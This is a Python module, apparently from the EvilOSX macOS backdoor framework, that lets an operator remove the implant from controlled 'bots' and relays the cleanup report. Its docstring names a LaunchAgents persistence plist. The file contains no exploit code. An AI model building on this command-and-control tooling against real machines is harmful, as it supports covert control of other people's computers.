# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Remove EvilOSX from the bot (graceful multi-loader cleanup).",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Notify when the bot is removed? [y/N]: "
        ]

    def setup(self, set_options):
        """Confirm the destructive action and collect notification preference."""
        should_continue = self._view.should_continue([
            "You are about to remove EvilOSX from the bot(s).",
            "This will delete the persistent loader AND the running configuration."
        ])

        if not should_continue:
            self._view.output("Remove cancelled.", "info")
            return False, None

        should_notify = bool(set_options and len(set_options) > 0 and str(set_options[0]).strip().lower() == "y")

        return True, {
            "response_options": {
                "should_notify": should_notify
            }
        }

    def process_response(self, response, response_options):
        """Handles the loader's removal output in a graceful, inspection-friendly way.

        The loader's `remove.py` streams back a best-effort cleanup report, e.g.:

            [remove_bot] Goodbye!
            + Removed ~/Library/LaunchAgents/<name>.plist
            + launchctl unload <name>

        This module simply relays those messages (or a normalised fallback) so the
        operator always gets clear feedback, regardless of the invoked loader.
        """
        str_response = response
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()

        if not str_response or not str_response.strip():
            self._view.output("Bot processed the removal request but returned no details.", "info")
            return

        removed_marker = "goodbye" in str_response.lower()

        if response_options.get("should_notify", False):
            self._view.output("Bot removal report:", "info")
            for line in str_response.splitlines():
                if line.strip():
                    self._view.output(line)

            if removed_marker:
                self._view.output("Removal completed successfully.", "info")
        else:
            # Only surface a short summary when notifications were not requested.
            if removed_marker:
                self._view.output("Bot removal completed.", "info")
            elif "error" in str_response.lower():
                self._view.output("Bot reported an error during removal:", "attention")
                self._view.output(str_response, "attention")
